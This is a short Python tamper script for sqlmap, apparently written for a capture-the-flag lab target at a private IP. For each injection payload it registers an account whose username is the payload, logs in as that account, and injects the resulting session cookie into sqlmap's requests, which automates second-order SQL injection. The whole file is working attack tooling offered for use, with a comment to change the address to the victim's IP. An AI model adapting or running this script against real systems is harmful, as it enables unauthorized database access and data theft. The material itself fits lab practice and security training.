#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

address = "http://10.10.224.105/challenge4" #change for victim's IP
password = "cyberlola"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload

#The folder where the tamper script is located will also need an empty __init__.py  file for sqlmap to be able to load it. 
